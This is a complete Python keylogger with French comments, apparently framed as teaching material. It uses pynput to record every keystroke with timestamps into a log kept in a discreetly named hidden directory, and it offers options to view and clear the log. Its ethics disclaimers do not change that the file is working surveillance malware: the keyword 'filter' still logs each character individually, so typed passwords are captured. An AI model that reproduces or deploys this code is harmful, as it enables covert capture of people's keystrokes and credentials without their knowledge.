#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
KEYLOGGER - Enregistreur de frappes clavier

AVERTISSEMENT ÉTHIQUE CRITIQUE:
- ILLÉGAL sans autorisation explicite du propriétaire du système
- Violation grave de la vie privée (délit criminel)
- Utilisation personnelle uniquement, à titre éducatif
- Aucun déploiement sur systèmes tiers
- Non responsabilité : usage aux risques et périls de l'utilisateur

Ce code démontre techniques réelles de capture clavier pour fins pédagogiques
et red teaming personnel uniquement.
"""

import os
import sys
import logging
from datetime import datetime
from pathlib import Path

# Gestion des dépendances
try:
    from pynput import keyboard
except ImportError:
    print("Erreur: pynput non installé. Exécutez: pip install pynput")
    sys.exit(1)


# ============================================================================
# CONFIGURATION INITIALE
# ============================================================================

# Déterminer chemin du répertoire d'accueil (cross-platform)
HOME_DIR = Path.home()

# Répertoire de logs (discret - utiliser répertoire caché sur Linux/macOS)
LOG_DIR = HOME_DIR / ".cache" / "app_logs"  # Répertoire caché

# Fichier de log
LOG_FILE = LOG_DIR / "activity_log.txt"

# Filtrer les mots-clés sensibles
FILTERED_KEYWORDS = [
    "password", "passwd", "pwd", "secret", "key", "token",
    "credit", "card", "ssn", "social", "bitcoin", "crypto",
    "motdepasse", "mot_de_passe", "clé", "clé_api"
]

# Timeout listener (None = infini)
TIMEOUT_SECONDS = None


# ============================================================================
# INITIALISATION DU SYSTÈME DE LOGGING
# ============================================================================

def initialiser_logging():
    """
    Initialise le système de logging pour enregistrer les frappes clavier.

    Fonctionnalités:
    - Création automatique du répertoire de logs s'il n'existe pas
    - Configuration du format avec horodatage
    - Niveau de logging approprié

    Returns:
        logging.Logger: Logger configuré
    """
    try:
        # Créer répertoire s'il n'existe pas
        LOG_DIR.mkdir(parents=True, exist_ok=True)

        # Configurer logger
        logger = logging.getLogger("keylogger")
        logger.setLevel(logging.INFO)

        # Handler fichier
        file_handler = logging.FileHandler(LOG_FILE, mode='a', encoding='utf-8')

        # Format : timestamp | type_événement | contenu
        formatter = logging.Formatter(
            '%(asctime)s | %(levelname)s | %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        file_handler.setFormatter(formatter)

        # Ajouter handler au logger (éviter doublons)
        if not logger.handlers:
            logger.addHandler(file_handler)

        return logger

    except Exception as e:
        print(f"Erreur initialisation logging: {e}")
        sys.exit(1)


# ============================================================================
# DÉTECTION DE CONTENU SENSIBLE
# ============================================================================

def contient_mot_sensible(texte):
    """
    Vérifie si le texte contient des mots-clés sensibles à filtrer.

    Args:
        texte (str): Texte à analyser

    Returns:
        bool: True si mot sensible détecté, False sinon
    """
    texte_lower = texte.lower()

    for keyword in FILTERED_KEYWORDS:
        if keyword.lower() in texte_lower:
            return True

    return False


# ============================================================================
# TRAITEMENT DES ÉVÉNEMENTS CLAVIER
# ============================================================================

class KeyloggerCallback:
    """
    Gestionnaire des callbacks pour événements clavier.

    Enregistre chaque frappe avec horodatage et contexte.
    Filtre les données sensibles.
    Gère les touches spéciales (Entrée, Tab, Shift, etc.).
    """

    def __init__(self, logger):
        """
        Initialise le callback avec références au logger.

        Args:
            logger: Logger pour enregistrer événements
        """
        self.logger = logger
        self.buffer = ""  # Buffer pour mots complets
        self.special_keys_count = 0

    def on_press(self, key):
        """
        Callback appelé lors de chaque appui sur une touche.

        Gère:
        - Caractères alphanumériques
        - Touches spéciales (Shift, Ctrl, Alt, etc.)
        - Touches de navigation (Entrée, Tab, Échappement)
        - Arrêt gracieux (Ctrl+C)

        Args:
            key: Objet Key de pynput
        """
        try:
            # Essayer d'obtenir le caractère
            char = key.char

            # Si succès, c'est une touche normale
            if char is not None:
                self.buffer += char

                # Enregistrer le caractère
                try:
                    self.logger.info(f"CHAR: {repr(char)}")
                except Exception as e:
                    print(f"Erreur enregistrement caractère: {e}")

        except AttributeError:
            # Touche spéciale (Shift, Ctrl, Alt, etc.)
            self._traiter_touche_speciale(key)

    def _traiter_touche_speciale(self, key):
        """
        Traite une touche spéciale.

        Enregistre touches de navigation et contrôle.
        Détecte interruption utilisateur (Ctrl+C).

        Args:
            key: Objet Key de pynput
        """
        try:
            # Conversion en string pour identifier la touche
            key_str = str(key)

            # Touches à enregistrer
            touches_importantes = {
                'Key.enter': '[ENTER]',
                'Key.space': '[SPACE]',
                'Key.tab': '[TAB]',
                'Key.backspace': '[BACKSPACE]',
                'Key.delete': '[DELETE]',
                'Key.shift': '[SHIFT]',
                'Key.ctrl_l': '[CTRL]',
                'Key.alt': '[ALT]',
                'Key.cmd': '[CMD]',
                'Key.esc': '[ESC]',
                'Key.home': '[HOME]',
                'Key.end': '[END]',
                'Key.up': '[UP]',
                'Key.down': '[DOWN]',
                'Key.left': '[LEFT]',
                'Key.right': '[RIGHT]',
                'Key.insert': '[INSERT]',
                'Key.page_up': '[PAGE_UP]',
                'Key.page_down': '[PAGE_DOWN]',
            }

            if key_str in touches_importantes:
                nom_touche = touches_importantes[key_str]
                self.logger.info(f"SPECIAL: {nom_touche}")

                # Vider buffer sur certains événements
                if key_str == 'Key.enter':
                    self._analyser_buffer()
                    self.buffer = ""

            # Détecter arrêt (Ctrl+C virtuel)
            if key_str == 'Key.esc':
                self.logger.info("USER: Session fermée par utilisateur")
                return False  # Arrêt du listener

        except Exception as e:
            self.logger.error(f"Erreur traitement touche spéciale: {e}")

    def _analyser_buffer(self):
        """
        Analyse le buffer pour détecter mots sensibles.

        Enregistre les mots avec filtrage des données sensibles.
        """
        if not self.buffer.strip():
            return

        # Vérifier contenu sensible
        if contient_mot_sensible(self.buffer):
            self.logger.warning(f"FILTERED: [DONNÉES SENSIBLES DÉTECTÉES - {len(self.buffer)} chars]")
        else:
            self.logger.info(f"WORD: {repr(self.buffer)}")

    def on_release(self, key):
        """
        Callback appelé lors du relâchement d'une touche.

        Note: Implémentation minimale - peut être étendue pour:
        - Mesurer durée appui (timing attack)
        - Détecter patterns spécifiques
        - Optimiser performance

        Args:
            key: Objet Key de pynput
        """
        pass  # À étendre selon besoins


# ============================================================================
# KEYLOGGER PRINCIPAL
# ============================================================================

class Keylogger:
    """
    Keylogger principal.

    Gère:
    - Initialisation du système
    - Boucle d'écoute des événements clavier
    - Gestion des signaux d'arrêt
    - Logging détaillé des événements
    """

    def __init__(self):
        """Initialise le keylogger."""
        self.logger = initialiser_logging()
        self.callback = KeyloggerCallback(self.logger)
        self.listener = None

        # Afficher informations startup
        self._afficher_infos_startup()

    def _afficher_infos_startup(self):
        """Affiche informations sur la session de démarrage."""
        self.logger.info("=" * 70)
        self.logger.info("KEYLOGGER DÉMARRÉ")
        self.logger.info(f"Système: {sys.platform}")
        self.logger.info(f"Répertoire logs: {LOG_FILE}")
        self.logger.info("=" * 70)

        print(f"\n[*] Keylogger en exécution...")
        print(f"[*] Logs: {LOG_FILE}")
        print(f"[*] Appuyez sur ESC pour arrêter\n")

    def _afficher_infos_shutdown(self):
        """Affiche informations sur la session d'arrêt."""
        self.logger.info("=" * 70)
        self.logger.info("KEYLOGGER ARRÊTÉ")
        self.logger.info("=" * 70)

        # Statistiques du fichier log
        try:
            if LOG_FILE.exists():
                taille_ko = LOG_FILE.stat().st_size / 1024
                lignes = len(LOG_FILE.read_text(encoding='utf-8').split('\n'))
                print(f"[+] Logs enregistrés: {LOG_FILE}")
                print(f"[+] Taille: {taille_ko:.2f} KB, Lignes: {lignes}")
        except Exception as e:
            print(f"[-] Erreur lecture stats: {e}")

    def demarrer(self):
        """
        Démarre le keylogger.

        Lance le listener qui capture tous les événements clavier
        jusqu'à arrêt (ESC ou Ctrl+C).
        """
        try:
            # Créer listener
            self.listener = keyboard.Listener(
                on_press=self.callback.on_press,
                on_release=self.callback.on_release
            )

            # Démarrer listener
            self.listener.start()

            # Attendre jusqu'à arrêt
            self.listener.join(timeout=TIMEOUT_SECONDS)

        except KeyboardInterrupt:
            print("\n[!] Interruption détectée (Ctrl+C)")
            self._afficher_infos_shutdown()
        except Exception as e:
            self.logger.error(f"ERREUR: {e}")
            print(f"[-] Erreur fatale: {e}")
        finally:
            self.arreter()

    def arreter(self):
        """Arrête le listener de manière gracieuse."""
        if self.listener:
            self.listener.stop()
            self._afficher_infos_shutdown()


# ============================================================================
# UTILITAIRES
# ============================================================================

def afficher_aide():
    """Affiche l'aide d'utilisation."""
    aide = f"""
KEYLOGGER - Enregistreur de frappes clavier

USAGE:
    python main.py [OPTION]

OPTIONS:
    (aucune)        Démarrer keylogger
    --help          Afficher cette aide
    --logs          Afficher contenu du fichier log
    --clear         Effacer le fichier log
    --path          Afficher chemin du fichier log

AVERTISSEMENT ÉTHIQUE:
    - ILLÉGAL sans autorisation explicite
    - Usage personnel et éducatif uniquement
    - Violation grave de la vie privée
    - Responsabilité de l'utilisateur

EXEMPLES:
    python main.py              # Démarrer keylogger
    python main.py --logs       # Voir enregistrements
    python main.py --path       # Chemin fichier log

CONTACT:
    Contact pour questions: [À remplir par l'enseignant]
"""
    print(aide)


def afficher_logs():
    """Affiche le contenu du fichier log."""
    try:
        if not LOG_FILE.exists():
            print("[!] Aucun fichier log trouvé")
            return

        contenu = LOG_FILE.read_text(encoding='utf-8')
        print("\n" + "=" * 70)
        print(f"CONTENU DU LOG: {LOG_FILE}")
        print("=" * 70)
        print(contenu)
        print("=" * 70 + "\n")

    except Exception as e:
        print(f"[-] Erreur lecture log: {e}")


def effacer_logs():
    """Efface le fichier log."""
    try:
        if LOG_FILE.exists():
            LOG_FILE.unlink()
            print(f"[+] Fichier log effacé: {LOG_FILE}")
        else:
            print("[!] Aucun fichier log à effacer")
    except Exception as e:
        print(f"[-] Erreur suppression: {e}")


def afficher_chemin_log():
    """Affiche le chemin du fichier log."""
    print(f"[*] Chemin du fichier log:")
    print(f"    {LOG_FILE}")
    print(f"    Répertoire: {LOG_DIR}")


# ============================================================================
# POINT D'ENTRÉE
# ============================================================================

def main():
    """Point d'entrée principal."""
    # Traiter arguments
    if len(sys.argv) > 1:
        arg = sys.argv[1]

        if arg in ['--help', '-h', 'help']:
            afficher_aide()
        elif arg == '--logs':
            afficher_logs()
        elif arg == '--clear':
            effacer_logs()
        elif arg == '--path':
            afficher_chemin_log()
        else:
            print(f"[!] Argument inconnu: {arg}")
            afficher_aide()
        return

    # Démarrer keylogger
    try:
        keylogger = Keylogger()
        keylogger.demarrer()
    except Exception as e:
        print(f"[-] Erreur fatale: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
